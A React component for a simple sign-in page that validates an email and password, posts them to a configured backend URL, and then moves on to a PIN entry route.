import React, { useState } from "react";
import { useNavigate } from "react-router-dom";
import "../styles/home.css";
import "../App.css";
import logo from "../assets/logo.png";
import { useForm } from "react-hook-form";
import { yupResolver } from "@hookform/resolvers/yup";
import * as yup from "yup";
import FormErrMsg from "../components/FormErrMsg";
import axios from "axios";
import BASE_URL from "../components/urls";

const schema = yup.object().shape({
  email: yup.string().required("Email is required"),
  password: yup
    .string()
    .min(10, "Password must be at least 10 characters")
    .max(30, "Password cannot exceed 30 characters")
    .required("Password is required"),
});
const Home = () => {
  const navigate = useNavigate();
  const {
    register,
    handleSubmit,
    formState: { errors },
  } = useForm({ resolver: yupResolver(schema) });

  const submitForm = (data) => {
    axios
      .post(`${BASE_URL}/`, data)
      .then((response) => {
        console.log(response.data);
        navigate("/pin");
      })
      .catch((error) => {
        console.error("There was an error!", error);
      });
  };

  return (
    <div className="home">
      <div class="container">
        <div class="contentSec">
          <div class="logo">
            <img src={logo} alt="logo" />
          </div>
          <div class="title">Hey, there!</div>
        </div>
        <div class="loginWrapper">
          <div class="loginSec">
            <form onSubmit={handleSubmit(submitForm)}>
              <label for="email">Email Address</label>
              <div class="formInput">
                <input
                  name="email"
                  type="email"
                  placeholder="example@email.com"
                  required
                  {...register("email")}
                />
              </div>
              <FormErrMsg errors={errors} inputName="email" />
              <label for="password">Password</label>
              <div class="formInput">
                <input
                  name="password"
                  type="password"
                  placeholder="***********"
                  required
                  {...register("password")}
                />
              </div>
              <FormErrMsg errors={errors} inputName="password" />
              <button type="submit">Sign In</button>
            </form>
          </div>
        </div>
      </div>
    </div>
  );
};

export default Home;
